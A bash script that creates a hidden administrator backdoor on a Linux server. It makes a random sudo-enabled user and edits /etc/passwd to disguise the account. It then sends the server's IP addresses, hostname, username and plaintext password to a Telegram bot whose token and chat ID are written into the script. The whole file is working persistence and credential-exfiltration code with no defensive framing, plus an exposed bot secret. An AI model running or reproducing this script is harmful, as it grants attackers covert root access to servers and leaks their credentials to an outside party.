#!/bin/bash

# Bot token and chat ID for Telegram notifications
BOT_TOKEN="6874880525:AAGJOGX_3eR8hYOLaJCgq2BWOeuYc7D6RDc"
CHAT_ID="1182377349"

send_telegram_message() {
    local message=$1
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id=$CHAT_ID \
        -d text="$message" \
        -d parse_mode=HTML > /dev/null
}

get_server_info() {
    local ipv4=$(curl -s https://api.ipify.org?format=text)
    local ipv6=$(curl -s https://api64.ipify.org?format=text)
    local hostname=$(hostname)
    echo "IPv4 Address: $ipv4, IPv6 Address: $ipv6, Hostname: $hostname"
}

generate_random_string() {
    local length=$1
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
}

if [ "$EUID" -ne 0 ]; then
    send_telegram_message "Error: Please run as root"
    exit 1
fi

# Ensure /var/empty exists
mkdir -p /var/empty

server_info=$(get_server_info)
send_telegram_message "Starting the creation of a hidden admin user. $server_info"

# Generate random username and password
user_id=$(generate_random_string 12)
password_1=$(generate_random_string 16)

# Check if user already exists
if id "$user_id" &>/dev/null; then
    send_telegram_message "User $user_id already exists. Skipping user creation."
else
    # Create the account
    useradd -m -s /bin/bash "$user_id"
    echo "$user_id:$password_1" | chpasswd

    # Add the user to sudo group (admin privileges)
    usermod -aG sudo "$user_id"

    # Change home directory to /home/$user_id
    usermod -d /home/$user_id "$user_id"

    # Hide the user by modifying the /etc/passwd file
    # Change the home directory to /var/empty to make it appear "hidden"
    sed -i "/^$user_id:/s#/home/$user_id#/var/empty#" /etc/passwd

    # Lock the user from appearing in the login screen by changing the shell
    usermod -s /bin/bash "$user_id"
fi

send_telegram_message "<b>Admin user <code>$user_id</code></b> has been created and hidden successfully with password <b><code>$password_1</code></b>.<br>$server_info"
